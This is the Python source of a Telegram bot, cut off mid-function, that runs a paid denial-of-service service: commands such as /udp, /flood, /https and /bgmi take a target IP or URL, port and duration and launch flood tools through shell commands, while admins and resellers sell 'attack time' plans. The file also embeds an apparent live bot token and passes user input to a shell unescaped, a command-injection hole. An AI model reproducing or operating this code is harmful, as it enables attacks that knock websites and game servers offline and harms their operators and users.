import telebot
import requests
import threading
import subprocess
import psutil
import platform
from datetime import datetime, timedelta
import time
import speedtest
import os
import re

# Replace 'YOUR_TOKEN' with your actual bot token
TOKEN = '6983510985:AAFER_MsxSlCgke0N8h2rm90n2YEeqWtUWQ'

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to store user plans
user_plans = {}

# Dictionary to store user cooldowns
user_cooldowns = {}

# Admin usernames
admin_usernames = ["o_404_error_o", "username"]

# Reseller usernames
reseller_usernames = ["username", "username"]

# Command to add users with days, attacks, and cooldown
@bot.message_handler(commands=['add'])
def add_user(message):
    try:
        if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
            command = message.text.split()
            if len(command) == 5 or len(command) == 6:
                username = command[1]
                days = int(command[2])
                attacks = int(command[3])
                cooldown = int(command[4])
                end_date = datetime.now() + timedelta(days=days)
                
                # Save user plan to file
                with open('allusers.txt', 'a') as file:
                    file.write(f"{username} {end_date.strftime('%Y-%m-%d')} {attacks} {cooldown}\n")
                
                response = f"𝐔𝐬𝐞𝐫 @{username} 𝐚𝐝𝐝𝐞𝐝 𝐰𝐢𝐭𝐡 𝐩𝐥𝐚𝐧: {days} 𝐝𝐚𝐲𝐬, {attacks} 𝐭𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐭𝐢𝐦𝐞, 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬."
            else:
                response = "𝐔𝐬𝐚𝐠𝐞: /add 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞 𝐝𝐚𝐲𝐬 𝐭𝐨𝐭𝐚𝐥_𝐚𝐭𝐭𝐚𝐜𝐤𝐬_𝐭𝐢𝐦𝐞 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧"
        else:
            response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    except ValueError:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐯𝐚𝐥𝐮𝐞 𝐢𝐧 𝐭𝐡𝐞 𝐢𝐧𝐩𝐮𝐭."
    bot.reply_to(message, response)

# Command to check user plan
@bot.message_handler(commands=['plan'])
def check_plan(message):
    username = message.from_user.username
    if username in user_plans:
        plan_info = user_plans[username]
        end_date = plan_info['end_date'].strftime("%Y-%m-%d")
        attacks = plan_info['attacks']
        response = f"𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧: {end_date} - {attacks} 𝐭𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠."
    else:
        response = "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o"
    
    bot.reply_to(message, response)

# Function to load user plans from file
def load_user_plans():
    try:
        with open('allusers.txt', 'r') as file:
            for line in file:
                parts = line.strip().split()
                username = parts[0]
                end_date = datetime.strptime(parts[1], '%Y-%m-%d')
                attacks = int(parts[2])
                cooldown = int(parts[3])
                user_plans[username] = {'end_date': end_date, 'attacks': attacks, 'cooldown': cooldown}
    except FileNotFoundError:
        print("User plans file not found. Starting with empty plans.")

load_user_plans()

# Command to send attack
@bot.message_handler(commands=['https'])
def handle_attack(message):
    try:
        username = message.from_user.username
        if username in user_plans:
            command = message.text.split()
            if len(command) >= 3:
                target = ' '.join(command[1:-1])  # Join all arguments except the first and last to get the target URL
                # Check if the target is a valid URL
                if not re.match(r'^https?://\S+', target):
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐔𝐑𝐋."
                    bot.reply_to(message, response)
                    return
                time = min(int(command[-1]), 60)  # Last argument is the time
                if (datetime.now() - user_cooldowns.get(username, {}).get('last_attack_time', datetime.min)).seconds < user_plans[username]['cooldown']:
                    remaining_cooldown = user_plans[username]['cooldown'] - (datetime.now() - user_cooldowns.get(username, {}).get('last_attack_time', datetime.min)).seconds
                    response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {remaining_cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
                elif time > user_plans[username]['attacks']:
                    response = "𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝! 𝐁𝐮𝐲 𝐦𝐨𝐫𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐬!"
                elif count_ongoing_attacks() >= 3:
                    response = "[𝐇𝐓𝐓𝐏𝐒] 𝐀𝐥𝐥 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    full_command = f"python3 start.py {target} {time}"
                    subprocess.Popen(full_command, shell=True)
                    user_cooldowns.setdefault(username, {})['last_attack_time'] = datetime.now()
                    user_plans[username]['attacks'] -= time
                    user_cooldowns.setdefault(username, {})['target'] = target  # Set the target key
                    user_cooldowns.setdefault(username, {})['time'] = time  # Set the time key
                    # Save attack information to attacks.txt
                    with open("attacks.txt", "a") as file:
                        file.write(f"{username} {target} {time} {datetime.now()}\n")
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐇𝐓𝐓𝐏𝐒"
                    # Update allusers.txt with remaining attacks
                    update_allusers_file()
            else:
                response = "𝐔𝐬𝐚𝐠𝐞: /https [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐭𝐢𝐦𝐞]"
        else:
            response = "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o"
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /https [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
    bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for username, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[username]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def update_allusers_file():
    try:
        with open('allusers.txt', 'w') as file:
            for username, plan_info in user_plans.items():
                end_date = plan_info['end_date'].strftime("%Y-%m-%d")
                attacks = plan_info['attacks']
                cooldown = plan_info['cooldown']
                file.write(f"{username} {end_date} {attacks} {cooldown}\n")
    except Exception as e:
        print("Error updating allusers.txt file:", e)

# Command to send attack
@bot.message_handler(commands=['flood'])
def handle_attack(message):
    try:
        username = message.from_user.username
        if username in user_plans:
            command = message.text.split()
            if len(command) >= 3:
                target = ' '.join(command[1:-1])  # Join all arguments except the first and last to get the target URL
                # Check if the target is a valid URL
                if not re.match(r'^https?://\S+', target):
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐔𝐑𝐋."
                    bot.reply_to(message, response)
                    return
                time = min(int(command[-1]), 60)  # Last argument is the time
                if (datetime.now() - user_cooldowns.get(username, {}).get('last_attack_time', datetime.min)).seconds < user_plans[username]['cooldown']:
                    remaining_cooldown = user_plans[username]['cooldown'] - (datetime.now() - user_cooldowns.get(username, {}).get('last_attack_time', datetime.min)).seconds
                    response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {remaining_cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
                elif time > user_plans[username]['attacks']:
                    response = "𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝! 𝐁𝐮𝐲 𝐦𝐨𝐫𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐬!"
                elif count_ongoing_attacks() >= 3:
                    response = "[𝐅𝐋𝐎𝐎𝐃] 𝐀𝐥𝐥 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    full_command = f"python3 starthttp.py {target} GET {time}"
                    subprocess.Popen(full_command, shell=True)
                    user_cooldowns.setdefault(username, {})['last_attack_time'] = datetime.now()
                    user_plans[username]['attacks'] -= time
                    user_cooldowns.setdefault(username, {})['target'] = target  # Set the target key
                    user_cooldowns.setdefault(username, {})['time'] = time  # Set the time key
                    # Save attack information to attacks.txt
                    with open("attacks.txt", "a") as file:
                        file.write(f"{username} {target} {time} {datetime.now()}\n")
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐅𝐋𝐎𝐎𝐃"
                    # Update allusers.txt with remaining attacks
                    update_allusers_file()
            else:
                response = "𝐔𝐬𝐚𝐠𝐞: /flood [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐭𝐢𝐦𝐞]"
        else:
            response = "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o"
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /flood [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
    bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for username, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[username]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def update_allusers_file():
    try:
        with open('allusers.txt', 'w') as file:
            for username, plan_info in user_plans.items():
                end_date = plan_info['end_date'].strftime("%Y-%m-%d")
                attacks = plan_info['attacks']
                cooldown = plan_info['cooldown']
                file.write(f"{username} {end_date} {attacks} {cooldown}\n")
    except Exception as e:
        print("Error updating allusers.txt file:", e)

# Command to send attack
@bot.message_handler(commands=['udp'])
def handle_attack(message):
    try:
        username = message.from_user.username
        if username in user_plans:
            command = message.text.split()
            if len(command) == 4:
                target = command[1]
                port = command[2]
                time = min(int(command[3]), 60)  # Maximum time allowed is 60 seconds
                # Validate target IP
                if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏 𝐚𝐝𝐝𝐫𝐞𝐬𝐬."
                # Validate port
                elif not port.isdigit() or not (1 <= int(port) <= 65535):
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫."
                # Validate time
                elif not (1 <= time <= 60):
                    response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
                elif check_cooldown(username):
                    cooldown_seconds = get_cooldown_remaining(username)
                    response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {cooldown_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
                else:
                    if user_plans[username]['attacks'] < time:
                        response = "𝐘𝐨𝐮𝐫 𝐩𝐥𝐚𝐧 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝! 𝐁𝐮𝐲 𝐦𝐨𝐫𝐞 𝐚𝐭𝐭𝐚𝐜𝐤𝐬!"
                    elif count_ongoing_attacks() >= 3:
                        response = "[𝐔𝐃𝐏] 𝐀𝐥𝐥 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 100"
                        subprocess.Popen(full_command, shell=True)
                        response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐔𝐃𝐏"
                        # Update user's remaining attacks
                        user_plans[username]['attacks'] -= time
                        # Update allusers.txt with remaining attacks
                        update_allusers_file()
                        # Update ongoing attacks dictionary
                        user_cooldowns.setdefault(username, {})['last_attack_time'] = datetime.now()
                        user_cooldowns.setdefault(username, {})['target'] = target
                        user_cooldowns.setdefault(username, {})['time'] = time
                        # Save attack information to attacks.txt
                        with open("attacks.txt", "a") as file:
                            file.write(f"{username} {target} {time} {datetime.now()}\n")
            else:
                response = "𝐔𝐬𝐚𝐠𝐞: /udp [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        else:
            response = "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o."
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /udp [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
    bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for username, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[username]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def check_cooldown(username):
    if username in user_cooldowns:
        last_attack_time = user_cooldowns[username].get('last_attack_time', datetime.min)
        time_difference = datetime.now() - last_attack_time
        if time_difference < timedelta(seconds=60):  # 60 seconds cooldown
            return True
    return False

def get_cooldown_remaining(username):
    last_attack_time = user_cooldowns[username].get('last_attack_time', datetime.min)
    time_difference = datetime.now() - last_attack_time
    cooldown_seconds = max(0, int((timedelta(seconds=60) - time_difference).total_seconds()))
    return cooldown_seconds

def update_allusers_file():
    try:
        with open('allusers.txt', 'w') as file:
            for username, plan_info in user_plans.items():
                end_date = plan_info['end_date'].strftime("%Y-%m-%d")
                attacks = plan_info['attacks']
                cooldown = plan_info['cooldown']
                file.write(f"{username} {end_date} {attacks} {cooldown}\n")
    except Exception as e:
        print("Error updating allusers.txt file:", e)

# Define your Telegram group ID
YOUR_GROUP_ID = "-1002145597666"

# Command to send attack
@bot.message_handler(commands=['bgmi'])
def handle_attack(message):
    try:
        # Check if the message is from your group
        if str(message.chat.id) != YOUR_GROUP_ID:
            response = "𝐘𝐨𝐮 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐮𝐬𝐞 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 @bgmi_ddos_powerful"
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = command[2]
            time = min(int(command[3]), 60)  # Maximum time allowed is 60 seconds
            # Validate target IP
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏."
            # Validate port
            elif not port.isdigit() or not (1 <= int(port) <= 65535):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫."
            # Validate time
            elif not (1 <= time <= 60):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
            elif check_cooldown(message.from_user.id):
                cooldown_seconds = get_cooldown_remaining(message.from_user.id)
                response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {cooldown_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
            else:
                if count_ongoing_attacks() >= 2:
                    response = "𝐀𝐥𝐥 2 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    # Perform the attack
                    full_command = f"./GAME-UDP {target} {port} {time} 10"
                    subprocess.Popen(full_command, shell=True)
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐁𝐆𝐌𝐈"
                    # Update ongoing attacks dictionary
                    user_cooldowns.setdefault(message.from_user.id, {})['last_attack_time'] = datetime.now()
                    user_cooldowns.setdefault(message.from_user.id, {})['target'] = target
                    user_cooldowns.setdefault(message.from_user.id, {})['time'] = time
            bot.reply_to(message, response)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /bgmi [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
            bot.reply_to(message, response)
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /bgmi [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
        bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for user_id, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[user_id]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def check_cooldown(user_id):
    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
        time_difference = datetime.now() - last_attack_time
        if time_difference < timedelta(seconds=60):  # 60 seconds cooldown
            return True
    return False

def get_cooldown_remaining(user_id):
    last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
    time_difference = datetime.now() - last_attack_time
    cooldown_seconds = max(0, int((timedelta(seconds=60) - time_difference).total_seconds()))
    return cooldown_seconds

# Define your Telegram group ID
YOUR_GROUP_ID = "-1002145597666"

# Command to send attack
@bot.message_handler(commands=['pubg'])
def handle_attack(message):
    try:
        # Check if the message is from your group
        if str(message.chat.id) != YOUR_GROUP_ID:
            response = "𝐘𝐨𝐮 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐮𝐬𝐞 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 @bgmi_ddos_powerful"
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = command[2]
            time = min(int(command[3]), 60)  # Maximum time allowed is 60 seconds
            # Validate target IP
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏."
            # Validate port
            elif not port.isdigit() or not (1 <= int(port) <= 65535):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫."
            # Validate time
            elif not (1 <= time <= 60):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
            elif check_cooldown(message.from_user.id):
                cooldown_seconds = get_cooldown_remaining(message.from_user.id)
                response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {cooldown_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
            else:
                if count_ongoing_attacks() >= 2:
                    response = "𝐀𝐥𝐥 2 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    # Perform the attack
                    full_command = f"./GAME-UDP {target} {port} {time} 10"
                    subprocess.Popen(full_command, shell=True)
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐏𝐔𝐁𝐆"
                    # Update ongoing attacks dictionary
                    user_cooldowns.setdefault(message.from_user.id, {})['last_attack_time'] = datetime.now()
                    user_cooldowns.setdefault(message.from_user.id, {})['target'] = target
                    user_cooldowns.setdefault(message.from_user.id, {})['time'] = time
            bot.reply_to(message, response)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /pubg [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
            bot.reply_to(message, response)
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /pubg [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
        bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for user_id, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[user_id]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def check_cooldown(user_id):
    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
        time_difference = datetime.now() - last_attack_time
        if time_difference < timedelta(seconds=60):  # 60 seconds cooldown
            return True
    return False

def get_cooldown_remaining(user_id):
    last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
    time_difference = datetime.now() - last_attack_time
    cooldown_seconds = max(0, int((timedelta(seconds=60) - time_difference).total_seconds()))
    return cooldown_seconds

# Define your Telegram group ID
YOUR_GROUP_ID = "-1002145597666"

# Command to send attack
@bot.message_handler(commands=['freefire'])
def handle_attack(message):
    try:
        # Check if the message is from your group
        if str(message.chat.id) != YOUR_GROUP_ID:
            response = "𝐘𝐨𝐮 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐮𝐬𝐞 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 @bgmi_ddos_powerful"
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = command[2]
            time = min(int(command[3]), 60)  # Maximum time allowed is 60 seconds
            # Validate target IP
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏."
            # Validate port
            elif not port.isdigit() or not (1 <= int(port) <= 65535):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫."
            # Validate time
            elif not (1 <= time <= 60):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
            elif check_cooldown(message.from_user.id):
                cooldown_seconds = get_cooldown_remaining(message.from_user.id)
                response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {cooldown_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
            else:
                if count_ongoing_attacks() >= 2:
